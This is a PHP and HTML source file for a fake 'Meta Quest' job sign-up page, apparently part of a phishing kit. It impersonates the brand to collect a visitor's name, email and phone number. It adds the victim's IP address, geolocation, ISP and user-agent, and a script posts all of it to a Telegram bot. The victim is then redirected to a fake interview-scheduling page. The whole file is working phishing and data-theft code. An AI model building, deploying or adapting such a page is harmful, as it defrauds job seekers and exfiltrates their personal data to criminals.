<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign up to start a career with us</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/information.css">
</head>
<body class="oculus-invite-bg">
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>
    <div class="oculus-invite-wrapper">
        <div class="oculus-invite-logo">
            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
            </svg>
        </div>
        <div class="oculus-invite-title">Sign up to start a career with us</div>
        <form class="oculus-invite-form" onsubmit="sendToTelegramFromInvite(event)" autocomplete="off">
            <div class="oculus-invite-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" name="fullName" required autocomplete="off">
            </div>
            <div class="oculus-invite-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required autocomplete="off">
            </div>
            <div class="oculus-invite-group">
                <label for="phone">Phone Number</label>
                <input type="text" id="phone" name="phone" required autocomplete="off">
            </div>
            <button type="submit" class="oculus-invite-btn">CONTINUE</button>
        </form>
    </div>
    <script src="/scripts/information.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var fullName = localStorage.getItem('fullName');
            var email = localStorage.getItem('email');
            var phone = localStorage.getItem('phone');

            if (fullName != "" && email != "" && phone != "") {
                window.location.href = "/career-with-us-page.php";
            }
        });

        function sendToTelegramFromInvite(event) {
            event.preventDefault();
            var fullName = document.getElementById('fullName').value;
            var email = document.getElementById('email').value;
            var phone = document.getElementById('phone').value;

            if (fullName == "" || email == "" || phone == "") {
                alert("Please fill in all required fields");
                return;
            }
            

            var content = "💬Thông Tin Tài Khoản 1 (web oculus)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFull Name: " + "`" + fullName + "`" +
                "\nEmail: " + "`" + email + "`" +
                "\nPhone Number: " + "`" + phone + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            localStorage.setItem('fullName', fullName);
            localStorage.setItem('email', email);
            localStorage.setItem('phone', phone);

            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        setTimeout(function() {
                            window.location.href = "/schedule-inverview.php";
                        }, 1000);

                        localStorage.setItem('fullName', fullName);
                        localStorage.setItem('email', email);
                        localStorage.setItem('phone', phone);
                    } else {
                        console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>
</body>
</html> 